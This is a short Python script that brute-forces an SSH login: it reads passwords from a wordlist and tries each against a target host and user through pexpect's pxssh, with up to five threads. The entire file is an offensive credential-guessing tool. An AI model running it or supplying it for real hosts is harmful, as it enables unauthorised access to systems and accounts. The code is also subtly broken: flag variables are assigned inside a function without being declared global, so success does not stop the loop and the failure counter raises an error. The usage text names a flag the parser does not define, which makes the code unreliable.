from pexpect import pxssh
import argparse
import time
import threading

maxConnections = 5
ssh_lock = threading.BoundedSemaphore(value=maxConnections)


Found = False
Fails = 0

def connect(host, user, password, release=True):
    try:
        s = pxssh.pxssh()
        s.login(host, user, password)
        print(f'[+] Password found : {password}')
        Found = True

    except Exception as e:
        if 'read_nonblocking' in str(e):
            Fails += 1
            time.sleep(5)
            connect(host, user, password, False)
        elif 'synchronize with original prompt' in str(e):
            time.sleep(1)
            connect(host, user, password, False)

    finally:
        if release:
            ssh_lock.release()

def main():
    parser = argparse.ArgumentParser(usage = 'ssh_pxssh_bruteforce.py TARGET_HOST -u USERNAME -p PASSSWD_FILE')
    parser.add_argument('tgt_host', type=str, metavar='TARGET_HOST', help="specify the target host")
    parser.add_argument('-u', type=str, metavar='USERNAME', required=True,help="specify the user name")
    parser.add_argument('-f', type=str, metavar='PASSWD_FILE', required=True,help="specify the wordlist's path")
    args = parser.parse_args()
    user= args.u
    passwd_file = args.f
    host = args.tgt_host
   

    with open(passwd_file) as file:
        for password in file.readlines():
            if Found:
                print("[*] Exiting: Password Found")
                exit(0)
            if Fails > 5:
                print("[-] Exiting: Too Many Socket Timeouts")
                exit(0)
            ssh_lock.acquire()
            password = password.strip('\n')
            print(f"[*] Testing Password : {password}")
            t = threading.Thread(target=connect, args=(host, user, password, True))
            child = t.start()
           
if __name__ == "__main__":
    main()
